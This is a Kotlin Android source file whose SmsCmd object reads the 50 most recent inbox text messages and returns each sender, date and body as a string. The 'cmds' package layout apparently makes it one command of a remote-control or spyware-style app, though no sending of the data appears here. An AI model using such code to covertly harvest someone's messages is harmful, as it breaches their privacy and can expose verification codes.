package com.serv.app.cmds

import android.Manifest
import android.content.Context
import android.provider.Telephony
import com.serv.app.core.Perms
import java.text.SimpleDateFormat
import java.util.*

object SmsCmd {
    fun run(ctx: Context): String {
        if (!Perms.has(ctx, Manifest.permission.READ_SMS)) return "Permissão faltando: READ_SMS"
        return try {
            val df = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US)
            val sb = StringBuilder()
            ctx.contentResolver.query(
                Telephony.Sms.Inbox.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
                null, null, "${Telephony.Sms.DATE} DESC"
            )?.use { c ->
                var n = 0
                while (c.moveToNext() && n < 50) {
                    val addr = c.getString(0) ?: "?"
                    val body = c.getString(1)?.replace("\n", " ") ?: ""
                    val dt = df.format(Date(c.getLong(2)))
                    sb.append("[$dt] $addr: ${body.take(120)}\n")
                    n++
                }
            }
            if (sb.isEmpty()) "Sem SMS." else sb.toString()
        } catch (t: Throwable) { "ERRO: ${t.message}" }
    }
}
